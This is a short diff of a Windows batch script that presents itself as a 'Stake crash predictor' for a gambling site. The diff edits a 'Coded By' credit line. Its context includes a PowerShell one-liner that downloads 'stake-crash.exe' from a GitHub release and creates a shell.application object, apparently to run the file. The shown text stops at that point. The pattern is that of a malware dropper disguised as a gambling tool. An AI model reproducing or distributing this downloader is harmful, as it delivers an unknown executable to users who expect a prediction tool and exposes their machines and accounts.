@@ -5,7 +5,7 @@ rem You can do any color
 color 0c
 
 echo.
-echo Coded By https://github.com/IW-CommunityXStake-Predictor
+echo Coded By https://github.com/Stake-Community
 echo.
 
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Community/Stake-Crash-Predictor/releases/download/stake-crash/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;
